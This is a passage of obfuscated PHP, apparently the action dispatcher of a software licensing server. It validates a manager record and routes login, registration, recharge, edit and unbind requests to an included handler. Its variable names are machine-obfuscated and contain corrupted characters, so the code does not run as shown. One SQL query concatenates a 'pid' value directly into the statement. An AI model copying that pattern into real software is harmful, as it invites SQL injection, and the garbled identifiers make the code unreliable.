$_obf_jpOTkJCPjI_TipSPjoeTjYs� = $_obf_jZGRipSRkIeUiIeQjoaUjJI�['pid']."_".$_obf_jZGRipSRkIeUiIeQjoaUjJI�['id'];
$_obf_iJSOjpOVh4qLjI6TkY2Rj44� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `pid`=".$_obf_jZGRipSRkIeUiIeQjoaUjJI�['pid']." and `level`>7" );
if ( empty( $_obf_iJSOjpOVh4qLjI6TkY2Rj44� ) )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno104" );
    }
    exit( "kssdata".QQ106 );
}
if ( $_obf_iJSOjpOVh4qLjI6TkY2Rj44�['endtime'] < _obf_jZGJkpOSkY_HiY2HjY2JlIg�( ) && $_obf_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno105" );
    }
    exit( "kssdata".QQ107.$_obf_iJSOjpOVh4qLjI6TkY2Rj44�['endtime'] );
}
if ( $_obf_iJSOjpOVh4qLjI6TkY2Rj44�['islock'] == 1 && $_obf_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno106" );
    }
    exit( "kssdata".QQ108 );
}
_obf_ho_Ki4_TiZCUk4yOkJCPh5M�( );
switch ( $_obf_kZGNjJSKkpCQj4yOj5GNiIo� )
{
case "unline" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "clientid" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "linecode" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8],
        "isrun" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[9]
    );
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "basechk" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[12],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[11],
        "clientid" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[10],
        "chked" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[9],
        "linecode" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8],
        "ischangesvr" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "softver" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "isrun" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "bdinfo" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[13],
        "valhost" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[14]
    );
    $_obf_ioiLiYmJlYySlIeQkpSQkpE� = substr( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['valhost'], 0, 2 );
    $_obf_hpCQiI_Ui42MkZSNko2Ni4Y� = $_obf_ioiLiYmJlYySlIeQkpSQkpE� % 3;
    if ( $_obf_hpCQiI_Ui42MkZSNko2Ni4Y� == 2 )
    {
        exit( "crypteno161" );
    }
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "advapi" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "czkey" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "clientid" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8],
        "linecode" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[9],
        "ischangesvr" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[10],
        "cmd" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[11]
    );
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "reguser" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "password2" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "bdinfo" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8],
        "puser" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[9],
        "czkey" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[10]
    );
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 || 32 < strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) )
    {
        exit( "kssdata".QQ109 );
    }
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['password'] ) < 5 )
    {
        exit( "kssdata".QQ110 );
    }
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['password2'] ) < 5 )
    {
        exit( "kssdata".QQ111 );
    }
    if ( 100 < strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['bdinfo'] ) )
    {
        exit( "kssdata".QQ112 );
    }
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "czuser" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "czkey" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6]
    );
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 )
    {
        exit( "kssdata".QQ113 );
    }
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['czkey'] ) < 32 )
    {
        exit( "kssdata".QQ114 );
    }
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "edituser" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "password2" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "bdinfo" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8]
    );
    if ( strlen( $_obf_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 )
    {
        exit( "kssdata".QQ113 );
    }
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "unbind" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5],
        "password" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[6],
        "clientid" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[7],
        "isrun" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[8]
    );
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
case "view_uk" :
    $_obf_lYqUjoqMiomGlYiQio6Qi4Y� = array(
        "username" => $_obf_k42Uko6Qk5CLiYqIjI_Ih5U�[5]
    );
    include( $_obf_k5CLh5CJiJOPiZGLlY_UiZE� );
    exit( );
}
ob_clean( );
if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
{
    exit( "crypteno119" );
}
exit( "kssdata".QQ115 );
?>
